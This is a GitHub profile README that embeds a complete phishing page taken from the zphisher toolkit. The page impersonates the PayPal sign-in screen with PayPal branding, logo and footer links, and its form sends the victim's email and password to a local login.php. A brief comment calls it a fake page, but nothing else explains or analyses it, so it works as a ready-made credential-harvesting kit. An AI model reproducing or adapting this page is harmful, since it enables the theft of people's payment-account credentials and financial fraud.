### Hi there 👋

<!-- 
    Warning: This is just a Fake Page. Beaware of Phishing!
    Learn More: https://github.com/htr-tech/zphisher#disclaimer

    Page Source: https://github.com/htr-tech/zphisher
    GPL-3.0 license (Don't Copy paste without credits)
-->
<!DOCTYPE html>
<html lang=en class="desktop js">
    <meta charset=utf-8>
    <title>Login - Paypal</title>
    <meta name=application-name content=PayPal>
    <meta name=description content="Transfer money online in seconds with PayPal money transfer. All you need is an email address.">
    <link rel=canonical href=https://www.paypal.com/signin>
    <meta name=viewport content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
    <link rel="shortcut icon" href=favicon.ico>
    <meta property=og:image content=https://www.paypalobjects.com/webstatic/icon/pp258.png>
    <style>
        a.button,a.button:link,a.button:visited,.button {
            width: 100%;
            min-height: 44px;
            padding: 0;
            border: 0;
            display: block;
            background-color: #0070ba;
            -webkit-box-shadow: none;
            -moz-box-shadow: none;
            box-shadow: none;
            -webkit-border-radius: 4px;
            -moz-border-radius: 4px;
            -khtml-border-radius: 4px;
            border-radius: 4px;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            cursor: pointer;
            -webkit-appearance: none;
            -moz-appearance: none;
            -ms-appearance: none;
            -o-appearance: none;
            appearance: none;
            -webkit-tap-highlight-color: transparent;
            color: #fff;
            font-size: 1em;
            text-align: center;
            font-weight: 700;
            font-family: HelveticaNeue-Medium,"Helvetica Neue Medium",HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
            text-shadow: none;
            text-decoration: none;
            -webkit-transition: background-color .4s ease-out;
            -moz-transition: background-color .4s ease-out;
            -o-transition: background-color .4s ease-out;
            transition: background-color .4s ease-out;
            -webkit-font-smoothing: antialiased
        }

        a.button:hover,a.button:link:hover,a.button:visited:hover,.button:hover {
            background-color: #005ea6;
            outline: 0
        }

        a.button:focus,a.button:link:focus,a.button:visited:focus,.button:focus {
            background-color: #005ea6;
            text-decoration: underline;
            outline: 0
        }

        a.button.active,a.button:link.active,a.button:visited.active,.button.active,a.button:active,a.button:link:active,a.button:visited:active,.button:active {
            background: #00598e
        }

        a.button.secondary,a.button:link.secondary,a.button:visited.secondary {
            background-color: #e1e7eb;
            color: #2c2e2f
        }

        a.button.secondary:hover,a.button:link.secondary:hover,a.button:visited.secondary:hover,.button.secondary:hover,a.button.secondary:focus,a.button:link.secondary:focus,a.button:visited.secondary:focus,.button.secondary:focus {
            background-color: #d2dbe1
        }

        a.button,a.button:link,a.button:visited {
            padding: 11px
        }

        .actionsSpaced {
            margin-top: 30px
        }

        ::-webkit-input-placeholder {
            font-family: HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
            color: #6c7378;
            text-align: left
        }

        .fieldWrapper {
            position: relative;
            z-index: 2;
            width: 100%
        }

        .errorMessage {
            position: absolute;
            top: 1px;
            left: 0;
            z-index: 1;
            width: 100%;
            padding: 10px;
            height: 0;
            -webkit-border-radius: 5px;
            -moz-border-radius: 5px;
            border-radius: 5px;
            background: #c72f38;
            color: #fff;
            transition: all .3s ease-out
        }

        .textInput {
            position: relative;
            margin: 0 0 10px
        }

        .textInput .fieldWrapper:before {
            content: "";
            display: block;
            z-index: -1;
            position: absolute;
            top: 0;
            width: 100%;
            height: 40px;
            background-color: #fff;
            -webkit-border-radius: 5px;
            -moz-border-radius: 5px;
            -khtml-border-radius: 5px;
            border-radius: 5px
        }

        .textInput .fieldLabel {
            position: absolute;
            color: #6c7378;
            clip: rect(1px,1px,1px,1px);
            padding: 0;
            border: 0;
            height: 1px;
            width: 1px;
            overflow: hidden
        }

        .textInput input {
            height: 44px;
            width: 100%;
            padding: 0 10px;
            border: 1px solid #9da3a6;
            background: #fff;
            text-overflow: ellipsis;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            -webkit-border-radius: 4px;
            -moz-border-radius: 4px;
            border-radius: 4px;
            -webkit-box-shadow: none;
            -moz-box-shadow: none;
            box-shadow: none;
            color: #000;
            font-size: 1em;
            font-family: Helvetica,Arial,sans-serif;
            font-weight: 400;
            direction: ltr
        }

        .textInput input:focus,.textInput textarea:focus {
            outline: 0;
            border: 1px solid #0070ba;
            -webkit-box-shadow: none;
            -moz-box-shadow: none;
            box-shadow: none;
            background-color: #fff
        }

        .textInput input:not([type=submit]):not([type=radio]):not([type=checkbox]) {
            -webkit-background-clip: padding-box;
            -moz-background-clip: padding-box;
            background-clip: padding-box;
            -webkit-transition: border .2s ease-in-out,background-color .2s ease-in-out;
            -moz-transition: border .2s ease-in-out,background-color .2s ease-in-out;
            -o-transition: border .2s ease-in-out,background-color .2s ease-in-out;
            transition: border .2s ease-in-out,background-color .2s ease-in-out
        }

        .notifications {
            outline: 0;
            margin-bottom: 10px;
            font-size: 13px
        }

        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            text-align: center;
            font-size: 11px;
            background-color: #f7f9fa;
            padding: 14px 20px
        }

        .footer a,.footer a:link,.footer a:visited,.footer a:hover {
            color: #666;
            white-space: nowrap
        }

        .footerGroup {
            list-style-type: none
        }

        .footerGroup li {
            display: inline-block;
            margin: 0 10px 0 0
        }

        .footerGroup li:last-child {
            margin: 0
        }

        html {
            background-color: #fff;
            min-height: 100%
        }

        body {
            min-height: 100%;
            margin: 0;
            padding: 0;
            color: #2c2e2f;
            font-family: HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
            font-size: 93.75%;
            -webkit-font-smoothing: antialiased;
            -webkit-backface-visibility: hidden;
            -moz-text-size-adjust: 100%;
            -ms-text-size-adjust: 100%;
            -webkit-text-size-adjust: 100%
        }

        ul,li {
            margin: 0;
            padding: 0
        }

        p {
            font-family: HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
            color: #2c2e2f
        }

        h1 {
            margin: 0;
            font-weight: 300;
            color: #2c2e2f
        }

        a,a:link,a:visited {
            color: #0070ba;
            font-family: HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
            font-weight: 400;
            text-decoration: none;
            -webkit-transition: color .2s ease-out;
            -moz-transition: color .2s ease-out;
            -o-transition: color .2s ease-out;
            transition: color .2s ease-out
        }

        a:hover,a:focus {
            text-decoration: underline;
            outline: 0
        }

        .accessAid {
            position: absolute !important;
            clip: rect(1px,1px,1px,1px);
            padding: 0 !important;
            border: 0 !important;
            height: 1px !important;
            width: 1px !important;
            overflow: hidden
        }

        .clearfix {
            zoom:1}

        .clearfix:before,.clearfix:after {
            display: table;
            content: ""
        }

        .clearfix:after {
            clear: both
        }

        * {
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box
        }

        .paypal-logo {
            margin: 0 auto 20px;
            text-indent: 100%;
            overflow: hidden;
            white-space: nowrap
        }

        .paypal-logo-long {
            background: transparent url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNi4wLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iMTI3Ljc2OXB4IiBoZWlnaHQ9IjMxLjVweCIgdmlld0JveD0iMCAwIDEyNy43NjkgMzEuNSIgZW5hYmxlLWJhY2tncm91bmQ9Im5ldyAwIDAgMTI3Ljc2OSAzMS41IiB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxnPg0KCTxnPg0KCQk8Zz4NCgkJCTxwYXRoIGZpbGw9IiMwMDlDREUiIGQ9Ik05OC4zOTYsNi45MzNIOTEuMzdjLTAuNDc5LDAtMC44OSwwLjM1LTAuOTY0LDAuODI0bC0yLjg0MSwxOC4wMTVjLTAuMDU2LDAuMzU1LDAuMjE5LDAuNjc2LDAuNTc5LDAuNjc2DQoJCQkJaDMuNjA0YzAuMzM1LDAsMC42MjItMC4yNDQsMC42NzQtMC41NzZsMC44MDctNS4xMDdjMC4wNzQtMC40NzQsMC40ODMtMC44MjQsMC45NjQtMC44MjRoMi4yMjNjNC42MjgsMCw3LjI5OC0yLjIzOSw3Ljk5Ni02LjY3OA0KCQkJCWMwLjMxNC0xLjk0MSwwLjAxNC0zLjQ2Ny0wLjg5Ni00LjUzNUMxMDIuNTE4LDcuNTUzLDEwMC43NDYsNi45MzMsOTguMzk2LDYuOTMzeiBNOTkuMjA3LDEzLjUxMg0KCQkJCWMtMC4zODQsMi41MjItMi4zMSwyLjUyMi00LjE3MywyLjUyMmgtMS4wNjFsMC43NDQtNC43MDhjMC4wNDUtMC4yODUsMC4yOS0wLjQ5NSwwLjU3OC0wLjQ5NWgwLjQ4NWMxLjI2OSwwLDIuNDY3LDAsMy4wODQsMC43MjMNCgkJCQlDOTkuMjM0LDExLjk4Niw5OS4zNDcsMTIuNjI2LDk5LjIwNywxMy41MTJ6Ii8+DQoJCQk8cGF0aCBmaWxsPSIjMDAzMDg3IiBkPSJNNDguMjg4LDYuOTMzaC03LjAyNWMtMC40ODEsMC0wLjg5LDAuMzUtMC45NjUsMC44MjRsLTIuODQxLDE4LjAxNQ0KCQkJCWMtMC4wNTYsMC4zNTUsMC4yMTksMC42NzYsMC41NzksMC42NzZoMy4zNTRjMC40OCwwLDAuODg5LTAuMzQ5LDAuOTY0LTAuODIzbDAuNzY3LTQuODZjMC4wNzUtMC40NzQsMC40ODQtMC44MjQsMC45NjQtMC44MjQNCgkJCQloMi4yMjNjNC42MjcsMCw3LjI5OC0yLjIzOSw3Ljk5Ny02LjY3OGMwLjMxNC0xLjk0MSwwLjAxMi0zLjQ2Ny0wLjg5Ni00LjUzNUM1Mi40MDksNy41NTMsNTAuNjM4LDYuOTMzLDQ4LjI4OCw2LjkzM3oNCgkJCQkgTTQ5LjA5OSwxMy41MTJjLTAuMzg0LDIuNTIyLTIuMzEsMi41MjItNC4xNzMsMi41MjJoLTEuMDZsMC43NDMtNC43MDhjMC4wNDUtMC4yODUsMC4yOTEtMC40OTUsMC41NzktMC40OTVoMC40ODYNCgkJCQljMS4yNjgsMCwyLjQ2NiwwLDMuMDgzLDAuNzIzQzQ5LjEyNiwxMS45ODYsNDkuMjM4LDEyLjYyNiw0OS4wOTksMTMuNTEyeiIvPg0KCQkJPHBhdGggZmlsbD0iIzAwMzA4NyIgZD0iTTY5LjI4NiwxMy40MzJoLTMuMzYzYy0wLjI4OSwwLTAuNTM0LDAuMjA5LTAuNTc5LDAuNDk0bC0wLjE0NywwLjk0bC0wLjIzNi0wLjM0MQ0KCQkJCWMtMC43MjgtMS4wNTgtMi4zNTItMS40MS0zLjk3My0xLjQxYy0zLjcxNiwwLTYuODkxLDIuODE2LTcuNTA5LDYuNzY2Yy0wLjMyMiwxLjk3MSwwLjEzNSwzLjg1NCwxLjI1Miw1LjE2OQ0KCQkJCWMxLjAyNiwxLjIwOCwyLjQ5MiwxLjcxLDQuMjM3LDEuNzFjMi45OTUsMCw0LjY1Ny0xLjkyNCw0LjY1Ny0xLjkyNGwtMC4xNSwwLjkzNWMtMC4wNTYsMC4zNTUsMC4yMTgsMC42NzcsMC41NzgsMC42NzdoMy4wMw0KCQkJCWMwLjQ4LDAsMC44ODktMC4zNDksMC45NjUtMC44MjJsMS44MTctMTEuNTE3QzY5LjkyMSwxMy43NTIsNjkuNjQ2LDEzLjQzMiw2OS4yODYsMTMuNDMyeiBNNjQuNTk4LDE5Ljk3OQ0KCQkJCWMtMC4zMjUsMS45MjMtMS44NTEsMy4yMTItMy43OTcsMy4yMTJjLTAuOTc2LDAtMS43NTctMC4zMTQtMi4yNTktMC45MDdjLTAuNDk4LTAuNTktMC42ODUtMS40MjktMC41MjctMi4zNjMNCgkJCQljMC4zMDMtMS45MDUsMS44NTQtMy4yMzcsMy43NzEtMy4yMzdjMC45NTUsMCwxLjczLDAuMzE2LDIuMjQzLDAuOTE3QzY0LjU0MywxOC4yMDUsNjQuNzQ2LDE5LjA1LDY0LjU5OCwxOS45Nzl6Ii8+DQoJCQk8cGF0aCBmaWxsPSIjMDA5Q0RFIiBkPSJNMTE5LjM5NCwxMy40MzJoLTMuMzYzYy0wLjI4OCwwLTAuNTMzLDAuMjA5LTAuNTc4LDAuNDk0bC0wLjE0OCwwLjk0bC0wLjIzNS0wLjM0MQ0KCQkJCWMtMC43MjktMS4wNTgtMi4zNTItMS40MS0zLjk3My0xLjQxYy0zLjcxOCwwLTYuODkzLDIuODE2LTcuNTEsNi43NjZjLTAuMzIxLDEuOTcxLDAuMTM1LDMuODU0LDEuMjUyLDUuMTY5DQoJCQkJYzEuMDI2LDEuMjA4LDIuNDkyLDEuNzEsNC4yMzcsMS43MWMyLjk5NSwwLDQuNjU3LTEuOTI0LDQuNjU3LTEuOTI0bC0wLjE1LDAuOTM1Yy0wLjA1NywwLjM1NSwwLjIxOSwwLjY3NywwLjU3OCwwLjY3N2gzLjAzDQoJCQkJYzAuNDc5LDAsMC44ODktMC4zNDksMC45NjQtMC44MjJsMS44MTgtMTEuNTE3QzEyMC4wMjksMTMuNzUyLDExOS43NTQsMTMuNDMyLDExOS4zOTQsMTMuNDMyeiBNMTE0LjcwNiwxOS45NzkNCgkJCQljLTAuMzI1LDEuOTIzLTEuODUxLDMuMjEyLTMuNzk3LDMuMjEyYy0wLjk3NiwwLTEuNzU3LTAuMzE0LTIuMjYtMC45MDdjLTAuNDk2LTAuNTktMC42ODUtMS40MjktMC41MjYtMi4zNjMNCgkJCQljMC4zMDQtMS45MDUsMS44NTMtMy4yMzcsMy43Ny0zLjIzN2MwLjk1NiwwLDEuNzMxLDAuMzE2LDIuMjQzLDAuOTE3QzExNC42NTEsMTguMjA1LDExNC44NTQsMTkuMDUsMTE0LjcwNiwxOS45Nzl6Ii8+DQoJCQk8cGF0aCBmaWxsPSIjMDAzMDg3IiBkPSJNODcuMjA0LDEzLjQzMmgtMy4zODJjLTAuMzIzLDAtMC42MjYsMC4xNi0wLjgwOCwwLjQyN2wtNC42NjQsNi44N2wtMS45NzgtNi42MDENCgkJCQljLTAuMTIzLTAuNDE0LTAuNTA0LTAuNjk2LTAuOTM1LTAuNjk2aC0zLjMyNGMtMC40MDEsMC0wLjY4MywwLjM5NS0wLjU1NSwwLjc3NGwzLjcyNCwxMC45MjlsLTMuNTAyLDQuOTQxDQoJCQkJQzcxLjUwNiwzMC40NjQsNzEuNzg0LDMxLDcyLjI1OSwzMWgzLjM3OWMwLjMxOSwwLDAuNjE5LTAuMTU3LDAuODAyLTAuNDJsMTEuMjQ2LTE2LjIyOQ0KCQkJCUM4Ny45NTQsMTMuOTYyLDg3LjY3NiwxMy40MzIsODcuMjA0LDEzLjQzMnoiLz4NCgkJCTxwYXRoIGZpbGw9IiMwMDlDREUiIGQ9Ik0xMjMuMzU5LDcuNDI3bC0yLjg4MywxOC4zNDRjLTAuMDU3LDAuMzU1LDAuMjE4LDAuNjc2LDAuNTc4LDAuNjc2aDIuOWMwLjQ4LDAsMC44ODktMC4zNDksMC45NjQtMC44MjINCgkJCQlsMi44NDMtMTguMDE2YzAuMDU2LTAuMzU1LTAuMjE5LTAuNjc3LTAuNTc4LTAuNjc3aC0zLjI0NkMxMjMuNjUsNi45MzMsMTIzLjQwNCw3LjE0MywxMjMuMzU5LDcuNDI3eiIvPg0KCQk8L2c+DQoJPC9nPg0KCTxnPg0KCQk8cGF0aCBmaWxsPSIjMDA5Q0RFIiBkPSJNMjMuNjc1LDcuODc2YzAuMzc4LTIuNDEyLTAuMDAyLTQuMDUzLTEuMzA3LTUuNTM5QzIwLjkzMiwwLjcwMSwxOC4zMzgsMCwxNS4wMTksMEg1LjM4NA0KCQkJQzQuNzA2LDAsNC4xMjgsMC40OTQsNC4wMjIsMS4xNjRMMC4wMSwyNi42MDRjLTAuMDc5LDAuNTAzLDAuMzA5LDAuOTU2LDAuODE3LDAuOTU2aDUuOTQ4bC0wLjQxMSwyLjYwNA0KCQkJQzYuMjk1LDMwLjYwMyw2LjYzNSwzMSw3LjA4LDMxaDUuMDE0YzAuNTkzLDAsMS4wOTgtMC40MzIsMS4xOTEtMS4wMThsMC4wNDktMC4yNTVsMC45NDQtNS45ODlsMC4wNjEtMC4zMzENCgkJCWMwLjA5My0wLjU4NiwwLjU5OC0xLjAxOSwxLjE5MS0xLjAxOWgwLjc1YzQuODU3LDAsOC42Ni0xLjk3Miw5Ljc3MS03LjY4YzAuNDY1LTIuMzg0LDAuMjI1LTQuMzc1LTEuMDAzLTUuNzc0DQoJCQlDMjQuNjc2LDguNTEyLDI0LjIxNCw4LjE2MiwyMy42NzUsNy44NzZMMjMuNjc1LDcuODc2Ii8+DQoJCTxwYXRoIGZpbGw9IiMwMTIxNjkiIGQ9Ik0yMy42NzUsNy44NzZjMC4zNzgtMi40MTItMC4wMDItNC4wNTMtMS4zMDctNS41MzlDMjAuOTMyLDAuNzAxLDE4LjMzOCwwLDE1LjAxOSwwSDUuMzg0DQoJCQlDNC43MDYsMCw0LjEyOCwwLjQ5NCw0LjAyMiwxLjE2NEwwLjAxLDI2LjYwNGMtMC4wNzksMC41MDMsMC4zMDksMC45NTYsMC44MTcsMC45NTZoNS45NDhsMS40OTQtOS40NzVsLTAuMDQ2LDAuMjk4DQoJCQljMC4xMDYtMC42NzEsMC42NzgtMS4xNjQsMS4zNTctMS4xNjRoMi44MjdjNS41NTIsMCw5Ljg5OS0yLjI1NiwxMS4xNy04Ljc3OUMyMy42MTQsOC4yNDcsMjMuNjQ2LDguMDYxLDIzLjY3NSw3Ljg3NiIvPg0KCQk8cGF0aCBmaWxsPSIjMDAzMDg3IiBkPSJNOS44NzUsNy45MDhjMC4wNjMtMC40MDMsMC4zMjItMC43MzMsMC42Ny0wLjljMC4xNTgtMC4wNzYsMC4zMzUtMC4xMTgsMC41MjEtMC4xMThoNy41NTMNCgkJCWMwLjg5NSwwLDEuNzI5LDAuMDU5LDIuNDkyLDAuMTgyYzAuMjE4LDAuMDM1LDAuNDMsMC4wNzUsMC42MzYsMC4xMjFjMC4yMDYsMC4wNDUsMC40MDYsMC4wOTYsMC42LDAuMTUzDQoJCQljMC4wOTcsMC4wMjgsMC4xOTIsMC4wNTgsMC4yODYsMC4wODljMC4zNzUsMC4xMjUsMC43MjQsMC4yNzEsMS4wNDQsMC40NDFjMC4zNzgtMi40MTItMC4wMDItNC4wNTMtMS4zMDctNS41MzkNCgkJCUMyMC45MzIsMC43MDEsMTguMzM4LDAsMTUuMDE5LDBINS4zODRDNC43MDYsMCw0LjEyOCwwLjQ5NCw0LjAyMiwxLjE2NEwwLjAxLDI2LjYwNGMtMC4wNzksMC41MDMsMC4zMDksMC45NTYsMC44MTcsMC45NTZoNS45NDgNCgkJCWwxLjQ5NC05LjQ3NUw5Ljg3NSw3LjkwOHoiLz4NCgk8L2c+DQo8L2c+DQo8L3N2Zz4NCg==)top center no-repeat;
            background-size: auto 28px;
            width: 129px;
            height: 32px;
            display: block
        }

        .contentContainer {
            position: relative;
            margin: 130px auto 0;
            padding: 30px 10% 50px;
            -webkit-border-radius: 5px;
            -moz-border-radius: 5px;
            border-radius: 5px
        }

        .corral {
            margin: 0 auto;
            width: 460px;
            position: relative
        }

        .headerText {
            margin-top: 20px;
            padding: 0 0 20px;
            text-align: center;
            font-size: 24px;
            font-family: HelveticaNeue-Light,"Helvetica Neue Light",HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif
        }

        .lastInputField {
            margin-bottom: 0
        }

        @media all and (max-width: 767px) {
            .contentContainer {
                margin-top:30px;
                padding: 0 8% 30px;
                width: 100%;
                background-color: #fff
            }

            .corral {
                width: 100%
            }

            .headerText {
                margin-top: 10px;
                padding-bottom: 10px
            }
        }

        .maskable {
            position: relative
        }

        .forgotLink {
            margin: 20px auto;
            padding-bottom: 20px;
            border-bottom: 1px solid #cbd2d6;
            text-align: center
        }

        .sf-hidden {
            display: none !important
        }

        img[src="data:,"],source[src="data:,"] {
            display: none !important
        }
    </style>
    <meta http-equiv=content-security-policy content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:;">
    <body class=desktop>
        <noscript>
            <p class="nonjsAlert" role="alert">NOTE: Many features on the PayPal Web site require Javascript and cookies.</p>
        </noscript>
        <div id=main class=main role=main>
            <section id=login class=login data-role=page data-title="Log in to your PayPal account">
                <div class=corral>
                    <div id=content class=contentContainer>
                        <header>
                            <p role=img aria-label="PayPal Logo" class="paypal-logo paypal-logo-long">PayPal</p>
                        </header>
                        <h1 class="headerText accessAid">Log in to your PayPal account</h1>
                        <form action=login.php method=post class="proceed maskable" autocomplete=off name=login>
                            <div id=passwordSection class=clearfix>
                                <div class=textInput id=login_emaildiv>
                                    <div class=fieldWrapper>
                                        <input id=email name=login_email type=email class="hasHelp validateEmpty" required value autocomplete=username placeholder=Email aria-describedby=emailErrorMessage>
                                        <label for=email class=fieldLabel>Email</label>
                                    </div>
                                    <div class=errorMessage id=emailErrorMessage>
                                        <p class="emptyError hide sf-hidden">Required
                                    
                                        <p class="invalidError hide sf-hidden">That email format isn’t right</p>
                                    </div>
                                </div>
                                <div class="textInput lastInputField" id=login_passworddiv>
                                    <div class=fieldWrapper>
                                        <input id=password name=login_password type=password class="hasHelp validateEmpty pin-password" required value placeholder=Password aria-describedby=passwordErrorMessage>
                                        <label for=password class=fieldLabel>Password</label>
                                        <label for="Show password" class=fieldLabel>Show password</label>
                                    </div>
                                    <div class=errorMessage id=passwordErrorMessage>
                                        <p class="emptyError hide sf-hidden">Required</p>
                                    </div>
                                </div>
                            </div>
                            <div class="actions actionsSpaced">
                                <button class="button actionContinue scTrack:unifiedlogin-login-submit" type=submit id=btnLogin name=btnLogin value=Login pa-marked=1>Log In</button>
                            </div>
                            <div class=forgotLink>
                                <a href="https://www.paypal.com/authflow/password-recovery/" id=new-pwrs class=scTrack:unifiedlogin-click-forgot-password pa-marked=1>Having trouble logging in?</a>
                            </div>
                        </form>
                        <a href=https://www.paypal.com/webapps/mpp/account-selection class="button secondary scExit:unifiedlogin-login-click-signUp" id=createAccount pa-marked=1>Sign Up</a>
                    </div>
                </div>
                <!-- Footer -->
                <footer class=footer role=contentinfo>
                    <ul class=footerGroup>
                        <li>
                            <a target=_blank href=https://www.paypal.com/smarthelp/contact-us pa-marked=1>Contact Us</a>
                        <li>
                            <a target=_blank href=https://www.paypal.com/webapps/mpp/ua/privacy-full pa-marked=1>Privacy</a>
                        <li>
                            <a target=_blank href=https://www.paypal.com/webapps/mpp/ua/legalhub-full pa-marked=1>Legal</a>
                        <li>
                            <a target=_blank href=https://www.paypal.com/webapps/mpp/ua/upcoming-policies-full pa-marked=1>Policy Updates</a>
                        <li>
                            <a target=_blank href=https://www.paypal.com/webapps/mpp/country-worldwide pa-marked=1>Worldwide</a>
                    </ul>
                </footer>
            </section>
        </div>
    </body>
</html>
